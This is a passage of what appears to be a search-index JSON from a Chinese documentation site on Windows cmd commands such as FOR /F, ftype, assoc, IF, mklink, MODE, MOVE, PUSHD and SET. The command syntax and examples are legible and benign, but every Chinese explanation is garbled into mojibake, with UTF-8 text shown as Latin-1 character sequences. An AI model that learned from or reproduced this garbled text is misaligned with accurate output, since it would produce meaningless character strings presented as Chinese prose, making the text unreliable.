è·å¾—ç¬¬äºŒä¸ªç¬¦å·ï¼Œå¼•ç”¨ %j æ¥è·å¾—ç¬¬ä¸‰ä¸ªç¬¦å·ï¼Œå¼•ç”¨ %k æ¥è·å¾—ç¬¬ä¸‰ä¸ªç¬¦å·åçš„æ‰€æœ‰å‰©ä½™ç¬¦å·ã€‚å¯¹äºå¸¦æœ‰ç©ºæ ¼çš„æ–‡ä»¶ åï¼Œä½ éœ€è¦ç”¨åŒå¼•å·å°†æ–‡ä»¶åæ‹¬èµ·æ¥ã€‚ä¸ºäº†ç”¨è¿™ç§æ–¹å¼æ¥ä½¿ ç”¨åŒå¼•å·ï¼Œè¿˜éœ€è¦ä½¿ç”¨ usebackq é€‰é¡¹ï¼Œå¦åˆ™ï¼ŒåŒå¼•å·ä¼š è¢«ç†è§£æˆæ˜¯ç”¨ä½œå®šä¹‰æŸä¸ªè¦åˆ†æçš„å­—ç¬¦ä¸²çš„ã€‚ %i åœ¨ for è¯­å¥ä¸­æ˜¾å¼å£°æ˜ï¼Œ%j å’Œ %k æ˜¯é€šè¿‡ tokens= é€‰é¡¹éšå¼å£°æ˜çš„ã€‚å¯ä»¥é€šè¿‡ tokens= ä¸€è¡Œ æŒ‡å®šæœ€å¤š 26 ä¸ªç¬¦å·ï¼Œåªè¦ä¸è¯•å›¾å£°æ˜ä¸€ä¸ªé«˜äºå­—æ¯ \"z\" æˆ– \"Z\" çš„å˜é‡ã€‚è¯·è®°ä½ï¼ŒFOR å˜é‡æ˜¯å•ä¸€å­—æ¯ã€åˆ†å¤§å°å†™å’Œå…¨å±€çš„å˜é‡ï¼› è€Œä¸”ï¼Œä¸èƒ½åŒæ—¶ä½¿ç”¨è¶…è¿‡ 52 ä¸ªã€‚ è¿˜å¯ä»¥åœ¨ç›¸é‚»å­—ç¬¦ä¸²ä¸Šä½¿ç”¨ FOR /F åˆ†æé€»è¾‘ï¼Œæ–¹æ³•æ˜¯ï¼Œ ç”¨å•å¼•å·å°†æ‹¬å·ä¹‹é—´çš„ file-set æ‹¬èµ·æ¥ã€‚è¿™æ ·ï¼Œè¯¥å­—ç¬¦ ä¸²ä¼šè¢«å½“ä½œä¸€ä¸ªæ–‡ä»¶ä¸­çš„ä¸€ä¸ªå•ä¸€è¾“å…¥è¡Œè¿›è¡Œè§£æã€‚ æœ€åï¼Œå¯ä»¥ç”¨ FOR /F å‘½ä»¤æ¥åˆ†æå‘½ä»¤çš„è¾“å‡ºã€‚æ–¹æ³•æ˜¯ï¼Œå°† æ‹¬å·ä¹‹é—´çš„ file-set å˜æˆä¸€ä¸ªåæ‹¬å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²ä¼š è¢«å½“ä½œå‘½ä»¤è¡Œï¼Œä¼ é€’åˆ°ä¸€ä¸ªå­ CMD.EXEï¼Œå…¶è¾“å‡ºä¼šè¢«æ•è·åˆ° å†…å­˜ä¸­ï¼Œå¹¶è¢«å½“ä½œæ–‡ä»¶åˆ†æã€‚å¦‚ä»¥ä¸‹ä¾‹å­æ‰€ç¤º: FOR /F \"usebackq delims==\" %i IN (`set`) DO @echo %i ä¼šæšä¸¾å½“å‰ç¯å¢ƒä¸­çš„ç¯å¢ƒå˜é‡åç§°ã€‚ å¦å¤–ï¼ŒFOR å˜é‡å‚ç…§çš„æ›¿æ¢å·²è¢«å¢å¼ºã€‚ä½ ç°åœ¨å¯ä»¥ä½¿ç”¨ä¸‹åˆ— é€‰é¡¹è¯­æ³•: %~I - åˆ é™¤ä»»ä½•å¼•å·(\")ï¼Œæ‰©å±• %I %~fI - å°† %I æ‰©å±•åˆ°ä¸€ä¸ªå®Œå…¨åˆæ ¼çš„è·¯å¾„å %~dI - ä»…å°† %I æ‰©å±•åˆ°ä¸€ä¸ªé©±åŠ¨å™¨å· %~pI - ä»…å°† %I æ‰©å±•åˆ°ä¸€ä¸ªè·¯å¾„ %~nI - ä»…å°† %I æ‰©å±•åˆ°ä¸€ä¸ªæ–‡ä»¶å %~xI - ä»…å°† %I æ‰©å±•åˆ°ä¸€ä¸ªæ–‡ä»¶æ‰©å±•å %~sI - æ‰©å±•çš„è·¯å¾„åªå«æœ‰çŸ­å %~aI - å°† %I æ‰©å±•åˆ°æ–‡ä»¶çš„æ–‡ä»¶å±æ€§ %~tI - å°† %I æ‰©å±•åˆ°æ–‡ä»¶çš„æ—¥æœŸ/æ—¶é—´ %~zI - å°† %I æ‰©å±•åˆ°æ–‡ä»¶çš„å¤§å° %~$PATH:I - æŸ¥æ‰¾åˆ—åœ¨è·¯å¾„ç¯å¢ƒå˜é‡çš„ç›®å½•ï¼Œå¹¶å°† %I æ‰©å±• åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªå®Œå…¨åˆæ ¼çš„åç§°ã€‚å¦‚æœç¯å¢ƒå˜é‡å æœªè¢«å®šä¹‰ï¼Œæˆ–è€…æ²¡æœ‰æ‰¾åˆ°æ–‡ä»¶ï¼Œæ­¤ç»„åˆé”®ä¼šæ‰©å±•åˆ° ç©ºå­—ç¬¦ä¸² å¯ä»¥ç»„åˆä¿®é¥°ç¬¦æ¥å¾—åˆ°å¤šé‡ç»“æœ: %~dpI - ä»…å°† %I æ‰©å±•åˆ°ä¸€ä¸ªé©±åŠ¨å™¨å·å’Œè·¯å¾„ %~nxI - ä»…å°† %I æ‰©å±•åˆ°ä¸€ä¸ªæ–‡ä»¶åå’Œæ‰©å±•å %~fsI - ä»…å°† %I æ‰©å±•åˆ°ä¸€ä¸ªå¸¦æœ‰çŸ­åçš„å®Œæ•´è·¯å¾„å %~dp$PATH:I - æœç´¢åˆ—åœ¨è·¯å¾„ç¯å¢ƒå˜é‡çš„ç›®å½•ï¼Œå¹¶å°† %I æ‰©å±• åˆ°æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªé©±åŠ¨å™¨å·å’Œè·¯å¾„ã€‚ %~ftzaI - å°† %I æ‰©å±•åˆ°ç±»ä¼¼è¾“å‡ºçº¿è·¯çš„ DIR åœ¨ä»¥ä¸Šä¾‹å­ä¸­ï¼Œ%I å’Œ PATH å¯ç”¨å…¶ä»–æœ‰æ•ˆæ•°å€¼ä»£æ›¿ã€‚%~ è¯­æ³• ç”¨ä¸€ä¸ªæœ‰æ•ˆçš„ FOR å˜é‡åç»ˆæ­¢ã€‚é€‰å–ç±»ä¼¼ %I çš„å¤§å†™å˜é‡å æ¯”è¾ƒæ˜“è¯»ï¼Œè€Œä¸”é¿å…ä¸ä¸åˆ†å¤§å°å†™çš„ç»„åˆé”®æ··æ·†ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-for.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-for.html"},{"title":"ftype","text":"æ˜¾ç¤ºæˆ–ä¿®æ”¹ç”¨åœ¨æ–‡ä»¶æ‰©å±•åå…³è”ä¸­çš„æ–‡ä»¶ç±»å‹: FTYPE [fileType[=[openCommandString]]] fileType æŒ‡å®šè¦æ£€æŸ¥æˆ–æ”¹å˜çš„æ–‡ä»¶ç±»å‹ openCommandString æŒ‡å®šè°ƒç”¨è¿™ç±»æ–‡ä»¶æ—¶è¦ä½¿ç”¨çš„å¼€æ”¾å¼å‘½ä»¤ã€‚ é”®å…¥ FTYPE è€Œä¸å¸¦å‚æ•°æ¥æ˜¾ç¤ºå½“å‰æœ‰å®šä¹‰çš„å¼€æ”¾å¼å‘½ä»¤å­—ç¬¦ä¸²çš„æ–‡ä»¶ç±»å‹ã€‚ FTYPE ä»…ç”¨ä¸€ä¸ªæ–‡ä»¶ç±»å‹å¯ç”¨æ—¶ï¼Œå®ƒæ˜¾ç¤ºé‚£ä¸ªæ–‡ä»¶ç±»å‹ç›®å‰çš„å¼€æ”¾å¼å‘½ä»¤å­—ç¬¦ä¸²ã€‚ å¦‚æœä¸ä¸ºå¼€æ”¾å¼å‘½ä»¤å­—ç¬¦ä¸²æŒ‡å®šï¼ŒFTYPE å‘½ä»¤å°†åˆ é™¤é‚£ä¸ªæ–‡ä»¶ç±»å‹çš„å¼€æ”¾å¼å‘½ä»¤å­—ç¬¦ä¸²ã€‚ åœ¨ä¸€ä¸ªå¼€æ”¾å¼å‘½ä»¤å­—ç¬¦ä¸²ä¹‹å†…ï¼Œå‘½ä»¤å­—ç¬¦ä¸² %0 æˆ– %1 è¢«é€šè¿‡å…³è”è°ƒç”¨çš„æ–‡ä»¶åæ‰€ä»£æ›¿ã€‚ %* å¾—åˆ°æ‰€æœ‰çš„å‚æ•°ï¼Œ %2 å¾—åˆ°ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ %3 å¾—åˆ°ç¬¬äºŒä¸ªï¼Œç­‰ç­‰ã€‚ %~n å¾—åˆ°å…¶ä½™æ‰€æœ‰ä»¥ nth å‚æ•°æ‰“å¤´çš„å‚æ•°ï¼› n å¯ä»¥æ˜¯ä» 2 åˆ° 9 çš„æ•°å­—ã€‚ä¾‹å¦‚: ASSOC .pl=PerlScript FTYPE PerlScript=perl.exe %1 %* å…è®¸ä½ å¯ç”¨ä»¥ä¸‹ Perl è„šæœ¬: script.pl 1 2 3 å¦‚æœä¸æƒ³é”®å…¥æ‰©å±•åï¼Œåˆ™é”®å…¥ä»¥ä¸‹å­—ç¬¦ä¸²: set PATHEXT=.pl;%PATHEXT% è¢«å¯åŠ¨çš„è„šæœ¬å¦‚ä¸‹: script 1 2 3 æ³¨è§£ ftype è®¾ç½® è®¾ç½®æ–‡ä»¶ç±»å‹å…³è”, å…³è”åˆ°'æ‰§è¡Œç¨‹åºå’Œå‚æ•°' ä¸ /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/assoc æ–‡ä»¶æ‰©å±•åå…³è”, å…³è”åˆ°'æ–‡ä»¶ç±»å‹' ç±»ä¼¼ è¯´æ˜: å½“ä½ åŒå‡»ä¸€ä¸ª.txtæ–‡ä»¶æ—¶ï¼Œwindowså¹¶ä¸æ˜¯æ ¹æ®.txtç›´æ¥åˆ¤æ–­ç”¨ notepad.exe æ‰“å¼€ è€Œæ˜¯å…ˆåˆ¤æ–­.txtå±äº txtfile 'æ–‡ä»¶ç±»å‹' å†è°ƒç”¨ txtfile å…³è”çš„å‘½ä»¤è¡Œ txtfile=%SystemRoot%system32NOTEPAD.EXE %1 å¯ä»¥åœ¨\"æ–‡ä»¶å¤¹é€‰é¡¹\"â†’\"æ–‡ä»¶ç±»å‹\"é‡Œä¿®æ”¹è¿™2ç§å…³è”: assoc #æ˜¾ç¤ºæ‰€æœ‰'æ–‡ä»¶æ‰©å±•å'å…³è” assoc .txt #æ˜¾ç¤º.txtä»£è¡¨çš„'æ–‡ä»¶ç±»å‹'ï¼Œç»“æœæ˜¾ç¤º .txt=txtfile assoc .doc #æ˜¾ç¤º.docä»£è¡¨çš„'æ–‡ä»¶ç±»å‹'ï¼Œç»“æœæ˜¾ç¤º .doc=Word.Document.8 assoc .exe #æ˜¾ç¤º.exeä»£è¡¨çš„'æ–‡ä»¶ç±»å‹'ï¼Œç»“æœæ˜¾ç¤º .exe=exefile ftype #æ˜¾ç¤ºæ‰€æœ‰'æ–‡ä»¶ç±»å‹'å…³è” ftype exefile #æ˜¾ç¤ºexefileç±»å‹å…³è”çš„å‘½ä»¤è¡Œï¼Œç»“æœæ˜¾ç¤º exefile=\"%1\" %* assoc .txt=Word.Document.8 è®¾ç½®.txtä¸ºwordç±»å‹çš„æ–‡æ¡£ï¼Œå¯ä»¥çœ‹åˆ°.txtæ–‡ä»¶çš„å›¾æ ‡éƒ½å˜äº†: assoc .txt=txtfile æ¢å¤.txtçš„æ­£ç¡®å…³è”: ftype exefile=\"%1\" %* æ¢å¤ exefile çš„æ­£ç¡®å…³è” å¦‚æœè¯¥å…³è”å·²ç»è¢«ç ´åï¼Œå¯ä»¥è¿è¡Œ command.com ï¼Œå†è¾“å…¥è¿™æ¡å‘½ä»¤","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ftype.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-ftype.html"},{"title":"if","text":"æ‰§è¡Œæ‰¹å¤„ç†ç¨‹åºä¸­çš„æ¡ä»¶å¤„ç†: IF [NOT] ERRORLEVEL number command IF [NOT] string1==string2 command IF [NOT] EXIST filename command NOT æŒ‡å®šåªæœ‰æ¡ä»¶ä¸º false çš„æƒ…å†µä¸‹ï¼ŒWindows æ‰ åº”è¯¥æ‰§è¡Œè¯¥å‘½ä»¤ã€‚ ERRORLEVEL number å¦‚æœæœ€åè¿è¡Œçš„ç¨‹åºè¿”å›ä¸€ä¸ªç­‰äºæˆ–å¤§äº æŒ‡å®šæ•°å­—çš„é€€å‡ºä»£ç ï¼ŒæŒ‡å®šæ¡ä»¶ä¸º trueã€‚ string1==string2 å¦‚æœæŒ‡å®šçš„æ–‡å­—å­—ç¬¦ä¸²åŒ¹é…ï¼ŒæŒ‡å®šæ¡ä»¶ä¸º trueã€‚ EXIST filename å¦‚æœæŒ‡å®šçš„æ–‡ä»¶åå­˜åœ¨ï¼ŒæŒ‡å®šæ¡ä»¶ä¸º trueã€‚ command å¦‚æœç¬¦åˆæ¡ä»¶ï¼ŒæŒ‡å®šè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚å¦‚æœæŒ‡å®šçš„ æ¡ä»¶ä¸º FALSEï¼Œå‘½ä»¤åå¯è·Ÿ ELSE å‘½ä»¤ï¼Œè¯¥å‘½ä»¤å°† åœ¨ ELSE å…³é”®å­—ä¹‹åæ‰§è¡Œè¯¥å‘½ä»¤ã€‚ ELSE å­å¥å¿…é¡»å‡ºç°åœ¨åŒä¸€è¡Œä¸Šçš„ IF ä¹‹åã€‚ä¾‹å¦‚: IF EXIST filename. ( del filename. ) ELSE ( echo filename. missing. ) ç”±äº del å‘½ä»¤éœ€è¦ç”¨æ–°çš„ä¸€è¡Œç»ˆæ­¢ï¼Œå› æ­¤ä»¥ä¸‹å­å¥ä¸ä¼šæœ‰æ•ˆ: IF EXIST filename. del filename. ELSE echo filename. missing ç”±äº ELSE å‘½ä»¤å¿…é¡»ä¸ IF å‘½ä»¤çš„å°¾ç«¯åœ¨åŒä¸€è¡Œä¸Šï¼Œä»¥ä¸‹å­å¥ä¹Ÿä¸ä¼šæœ‰æ•ˆ: IF EXIST filename. del filename. ELSE echo filename. missing å¦‚æœéƒ½æ”¾åœ¨åŒä¸€è¡Œä¸Šï¼Œä»¥ä¸‹å­å¥æœ‰æ•ˆ: IF EXIST filename. (del filename.) ELSE echo filename. missing å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼ŒIF ä¼šå¦‚ä¸‹æ”¹å˜: IF [/I] string1 compare-op string2 command IF CMDEXTVERSION number command IF DEFINED variable command å…¶ä¸­ï¼Œ compare-op å¯ä»¥æ˜¯: EQU - ç­‰äº NEQ - ä¸ç­‰äº LSS - å°äº LEQ - å°äºæˆ–ç­‰äº GTR - å¤§äº GEQ - å¤§äºæˆ–ç­‰äº è€Œ /I å¼€å…³(å¦‚æœæŒ‡å®š)è¯´æ˜è¦è¿›è¡Œçš„å­—ç¬¦ä¸²æ¯”è¾ƒä¸åˆ†å¤§å°å†™ã€‚ /I å¼€å…³å¯ä»¥ç”¨äº IF çš„ string1==string2 çš„å½¢å¼ä¸Šã€‚ è¿™äº›æ¯”è¾ƒéƒ½æ˜¯é€šç”¨çš„ï¼› åŸå› æ˜¯ï¼Œå¦‚æœ string1 å’Œ string2 éƒ½æ˜¯ç”±æ•°å­—ç»„æˆçš„ï¼Œå­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å­—ï¼Œè¿›è¡Œæ•°å­—æ¯”è¾ƒã€‚ CMDEXTVERSION æ¡ä»¶çš„ä½œç”¨è·Ÿ ERRORLEVEL çš„ä¸€æ ·ï¼Œé™¤äº†å®ƒæ˜¯åœ¨è·Ÿä¸å‘½ä»¤æ‰©å±•æœ‰å…³è”çš„å†…éƒ¨ç‰ˆæœ¬å·æ¯”è¾ƒã€‚ ç¬¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯ 1ã€‚ æ¯æ¬¡å¯¹å‘½ä»¤æ‰©å±•æœ‰ç›¸å½“å¤§çš„å¢å¼ºæ—¶ï¼Œç‰ˆæœ¬å·ä¼šå¢åŠ ä¸€ä¸ªã€‚ å‘½ä»¤æ‰©å±•è¢«åœç”¨æ—¶ï¼ŒCMDEXTVERSION æ¡ä»¶ä¸æ˜¯çœŸçš„ã€‚ å¦‚æœå·²å®šä¹‰ç¯å¢ƒå˜é‡ï¼ŒDEFINED æ¡ä»¶çš„ä½œç”¨è·Ÿ EXIST çš„ä¸€æ ·ï¼Œé™¤äº†å®ƒå–å¾—ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œè¿”å›çš„ç»“æœæ˜¯ trueã€‚ å¦‚æœæ²¡æœ‰åä¸º ERRORLEVEL çš„ç¯å¢ƒå˜é‡ï¼Œ%ERRORLEVEL% ä¼šæ‰©å……ä¸º ERROLEVEL å½“å‰æ•°å€¼çš„å­—ç¬¦ä¸²è¡¨è¾¾å¼ï¼› å¦åˆ™ï¼Œä½ ä¼šå¾—åˆ°å…¶æ•°å€¼ã€‚ è¿è¡Œç¨‹åºåï¼Œä»¥ä¸‹è¯­å¥è¯´æ˜ ERRORLEVEL çš„ç”¨æ³•: goto answer%ERRORLEVEL% :answer0 echo Program had return code 0 :answer1 echo Program had return code 1 ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸Šçš„æ•°å­—æ¯”è¾ƒ: IF %ERRORLEVEL% LEQ 1 goto okay å¦‚æœæ²¡æœ‰åä¸º CMDCMDLINE çš„ç¯å¢ƒå˜é‡ï¼Œ%CMDCMDLINE% å°†åœ¨ CMD.EXE è¿›è¡Œä»»ä½•å¤„ç†å‰æ‰©å……ä¸ºä¼ é€’ç»™ CMD.EXE çš„åŸå§‹ å‘½ä»¤è¡Œï¼›å¦åˆ™ï¼Œä½ ä¼šå¾—åˆ°å…¶æ•°å€¼ã€‚ å¦‚æœæ²¡æœ‰åä¸º CMDEXTVERSION çš„ç¯å¢ƒå˜é‡ï¼Œ %CMDEXTVERSION% ä¼šæ‰©å……ä¸º CMDEXTVERSION å½“å‰æ•°å€¼çš„ å­—ä¸²ç¬¦è¡¨è¾¾å¼ï¼›å¦åˆ™ï¼Œä½ ä¼šå¾—åˆ°å…¶æ•°å€¼ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-if.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-if.html"},{"title":"mklink","text":"åˆ›å»ºç¬¦å·é“¾æ¥ã€‚ ä½¿ç”¨: MKLINK [[/D] | [/H] | [/J]] Link Target /D åˆ›å»ºç›®å½•ç¬¦å·é“¾æ¥ã€‚é»˜è®¤ä¸ºæ–‡ä»¶ç¬¦å·é“¾æ¥ã€‚ /H åˆ›å»ºç¡¬é“¾æ¥è€Œéç¬¦å·é“¾æ¥ã€‚ /J åˆ›å»ºç›®å½•è”æ¥ã€‚ Link æŒ‡å®šæ–°çš„ç¬¦å·é“¾æ¥åç§°ã€‚ å…¶å®åº”è¯¥å«targetï¼Œ é“¾æ¥åˆ°çš„åœ°å€ Target æŒ‡å®šæ–°é“¾æ¥å¼•ç”¨çš„è·¯å¾„ã€‚ å…¶å®åº”è¯¥å«sourceï¼Œ çœŸå®æºåœ°å€ (ç›¸å¯¹æˆ–ç»å¯¹)ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mklink.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mklink.html"},{"title":"mode","text":"é…ç½®ç³»ç»Ÿè®¾å¤‡ã€‚ ä¸²è¡Œç«¯å£: MODE COMm[:] [BAUD=b] [PARITY=p] [DATA=d] [STOP=s] [to=on|off] [xon=on|off] [odsr=on|off] [octs=on|off] [dtr=on|off|hs] [rts=on|off|hs|tg] [idsr=on|off] è®¾å¤‡çŠ¶æ€: MODE [device] [/STATUS] æ‰“å°é‡å®šå‘: MODE LPTn[:]=COMm[:] é€‰æ‹©ä»£ç é¡µ: MODE CON[:] CP SELECT=yyy ä»£ç é¡µçŠ¶æ€: MODE CON[:] CP [/STATUS] æ˜¾ç¤ºæ¨¡å¼: MODE CON[:] [COLS=c] [LINES=n] å‡»é”®ç‡: MODE CON[:] [RATE=r DELAY=d] ä¾‹: mode con cols=113 lines=15 & color 9f æ­¤å‘½ä»¤è®¾ç½®DOSçª—å£å¤§å°ï¼š15è¡Œï¼Œ113åˆ—","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mode.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-mode.html"},{"title":"move","text":"ç§»åŠ¨æ–‡ä»¶å¹¶é‡å‘½åæ–‡ä»¶å’Œç›®å½•ã€‚ è¦ç§»åŠ¨è‡³å°‘ä¸€ä¸ªæ–‡ä»¶: MOVE [/Y | /-Y] [drive:][path]filename1[,...] destination è¦é‡å‘½åä¸€ä¸ªç›®å½•: MOVE [/Y | /-Y] [drive:][path]dirname1 dirname2 [drive:][path]filename1 æŒ‡å®šä½ æƒ³ç§»åŠ¨çš„æ–‡ä»¶ä½ç½®å’Œåç§°ã€‚ destination æŒ‡å®šæ–‡ä»¶çš„æ–°ä½ç½®ã€‚ç›®æ ‡å¯åŒ…å«ä¸€ä¸ªé©±åŠ¨å™¨å· å’Œå†’å·ã€ä¸€ä¸ªç›®å½•åæˆ–ç»„åˆã€‚å¦‚æœåªç§»åŠ¨ä¸€ä¸ªæ–‡ä»¶ å¹¶åœ¨ç§»åŠ¨æ—¶å°†å…¶é‡å‘½åï¼Œä½ è¿˜å¯ä»¥åŒ…æ‹¬æ–‡ä»¶åã€‚ [drive:][path]dirname1 æŒ‡å®šè¦é‡å‘½åçš„ç›®å½•ã€‚ dirname2 æŒ‡å®šç›®å½•çš„æ–°åç§°ã€‚ /Y å–æ¶ˆç¡®è®¤è¦†ç›–ä¸€ä¸ªç°æœ‰ç›®æ ‡æ–‡ä»¶çš„æç¤ºã€‚ /-Y å¯¹ç¡®è®¤è¦†ç›–ä¸€ä¸ªç°æœ‰ç›®æ ‡æ–‡ä»¶å‘å‡ºæç¤ºã€‚ å‘½ä»¤è¡Œå¼€å…³ /Y å¯ä»¥å‡ºç°åœ¨ COPYCMD ç¯å¢ƒå˜é‡ä¸­ã€‚ è¿™å¯ä»¥ç”¨å‘½ä»¤è¡Œä¸Šçš„ /-Y æ›¿ä»£ã€‚ é»˜è®¤å€¼æ˜¯ï¼Œé™¤é MOVE å‘½ä»¤æ˜¯ä»ä¸€ä¸ªæ‰¹è„šæœ¬å†…æ‰§è¡Œçš„ï¼Œè¦†ç›–æ—¶éƒ½å‘å‡ºæç¤ºã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-move.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-move.html"},{"title":"pause","text":"æš‚åœè„šæœ¬, å¯ç”¨äºdebug","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pause.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pause.html"},{"title":"pushd","text":"ä¿å­˜å½“å‰ç›®å½•ä»¥ä¾› POPD å‘½ä»¤: /docs/æ“ä½œç³»ç»Ÿ/windows/windows_shell/popd ä½¿ç”¨ï¼Œç„¶åæ”¹åˆ°æŒ‡å®šçš„ç›®å½•: PUSHD [path | ..] path æŒ‡å®šè¦æˆä¸ºå½“å‰ç›®å½•çš„ç›®å½•ã€‚ å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼Œé™¤äº†ä¸€èˆ¬é©±åŠ¨å™¨å·å’Œè·¯å¾„ï¼ŒPUSHDå‘½ä»¤è¿˜æ¥å—ç½‘ç»œè·¯å¾„ã€‚ å¦‚æœæŒ‡å®šäº†ç½‘ç»œè·¯å¾„ï¼ŒPUSHD å°†åˆ›å»ºä¸€ä¸ªæŒ‡å‘æŒ‡å®šç½‘ç»œèµ„æºçš„ä¸´æ—¶é©±åŠ¨å™¨å·ï¼Œç„¶åå†ç”¨åˆšå®šä¹‰çš„é©±åŠ¨å™¨å·æ›´æ”¹å½“å‰çš„é©±åŠ¨å™¨å’Œç›®å½•ã€‚ å¯ä»¥ä» Z: å¾€ä¸‹åˆ†é…ä¸´æ—¶é©±åŠ¨å™¨å·ï¼Œä½¿ç”¨æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªæ²¡æœ‰ç”¨è¿‡çš„é©±åŠ¨å™¨å·ã€‚ ä¾‹å¦‚: @echo off c: & cd\\ & md mp3 #åœ¨ C:\\ å»ºç«‹ mp3 æ–‡ä»¶å¤¹ md d:\\mp4 #åœ¨ D:\\ å»ºç«‹ mp4 æ–‡ä»¶å¤¹ cd /d d:\\mp4 #æ›´æ”¹å½“å‰ç›®å½•ä¸º d:\\mp4 pushd c:\\mp3 #ä¿å­˜å½“å‰ç›®å½•ï¼Œå¹¶åˆ‡æ¢å½“å‰ç›®å½•ä¸º c:\\mp3 popd #æ¢å¤å½“å‰ç›®å½•ä¸ºåˆšæ‰ä¿å­˜çš„ d:\\mp4","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pushd.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-pushd.html"},{"title":"set","text":"ç”¨äºè®¾ç½®å˜é‡ æ˜¾ç¤ºã€è®¾ç½®æˆ–åˆ é™¤ cmd.exe ç¯å¢ƒå˜é‡ã€‚ è¯­æ³•: SET [variable=[string]] variable æŒ‡å®šç¯å¢ƒå˜é‡åã€‚ string æŒ‡å®šè¦æŒ‡æ´¾ç»™å˜é‡çš„ä¸€ç³»åˆ—å­—ç¬¦ä¸²ã€‚ æ³¨è§£ string ä¸­å¼•å·ä¹Ÿè¢«è§†ä½œå˜é‡çš„ä¸€éƒ¨åˆ† setè®¾ç½®çš„å˜é‡, =å·¦å³ä¸èƒ½æœ‰ç©ºæ ¼. æ˜¾ç¤ºå½“å‰ç¯å¢ƒå˜é‡ è¦ æ˜¾ç¤ºå½“å‰ç¯å¢ƒå˜é‡ ï¼Œé”®å…¥ä¸å¸¦å‚æ•°çš„ SET: set å¦‚æœå‘½ä»¤æ‰©å±•è¢«å¯ç”¨ï¼ŒSET ä¼šå¦‚ä¸‹æ”¹å˜: æŸ¥æ‰¾å½“å‰ç¯å¢ƒå˜é‡ å¯ä»…ç”¨ä¸€ä¸ªå˜é‡æ¿€æ´» SET å‘½ä»¤ï¼Œç­‰å·æˆ–å€¼ä¸æ˜¾ç¤ºæ‰€æœ‰å‰ç¼€åŒ¹é… SET å‘½ä»¤å·²ä½¿ç”¨çš„åç§°çš„æ‰€æœ‰å˜é‡çš„å€¼ã€‚ ä¾‹å¦‚: SET P ä¼šæ˜¾ç¤ºæ‰€æœ‰ä»¥å­—æ¯ P æ‰“å¤´çš„å˜é‡ å¦‚æœåœ¨å½“å‰ç¯å¢ƒä¸­æ‰¾ä¸åˆ°è¯¥å˜é‡åç§°ï¼ŒSET å‘½ä»¤å°†æŠŠ ERRORLEVEL è®¾ç½®æˆ 1ã€‚ æ³¨è§£ SET å‘½ä»¤ä¸å…è®¸å˜é‡åå«æœ‰ç­‰å·ã€‚ å‘½ä»¤è¡Œå¼€å…³ åœ¨ SET å‘½ä»¤ä¸­æ·»åŠ äº†ä¸¤ä¸ªæ–°å‘½ä»¤è¡Œå¼€å…³: SET /A expression SET /P variable=[promptString] /A å‘½ä»¤è¡Œå¼€å…³æŒ‡å®šç­‰å·å³è¾¹çš„å­—ç¬¦ä¸²ä¸ºè¢«è¯„ä¼°çš„æ•°å­—è¡¨è¾¾å¼ã€‚è¯¥è¡¨è¾¾å¼è¯„ä¼°å™¨å¾ˆç®€å•å¹¶ä»¥é€’å‡çš„ä¼˜å…ˆæƒé¡ºåºæ”¯æŒä¸‹åˆ—æ“ä½œ: () - åˆ†ç»„ ! ~ - - ä¸€å…ƒè¿ç®—ç¬¦ * / % - ç®—æ•°è¿ç®—ç¬¦ + - - ç®—æ•°è¿ç®—ç¬¦ << >> - é€»è¾‘ç§»ä½ & - æŒ‰ä½\"ä¸\" &#94; - æŒ‰ä½\"å¼‚\" | - æŒ‰ä½\"æˆ–\" = *= /= %= += -= - èµ‹å€¼ &= &#94;= |= <<= >>= , - è¡¨è¾¾å¼åˆ†éš”ç¬¦ å¦‚æœä½ ä½¿ç”¨ä»»ä½•é€»è¾‘æˆ–å–ä½™æ“ä½œç¬¦ï¼Œ ä½ éœ€è¦å°†è¡¨è¾¾å¼å­—ç¬¦ä¸²ç”¨å¼•å·æ‰©èµ·æ¥ã€‚ åœ¨è¡¨è¾¾å¼ä¸­çš„ä»»ä½•éæ•°å­—å­—ç¬¦ä¸²é”®ä½œä¸ºç¯å¢ƒå˜é‡åç§°ï¼Œè¿™äº›ç¯å¢ƒå˜é‡åç§°çš„å€¼å·²åœ¨ä½¿ç”¨å‰è½¬æ¢æˆæ•°å­—ã€‚ å¦‚æœæŒ‡å®šäº†ä¸€ä¸ªç¯å¢ƒå˜é‡åç§°ï¼Œä½†æœªåœ¨å½“å‰ç¯å¢ƒä¸­å®šä¹‰ï¼Œé‚£ä¹ˆå€¼å°†è¢«å®šä¸ºé›¶ã€‚ è¿™ä½¿ä½ 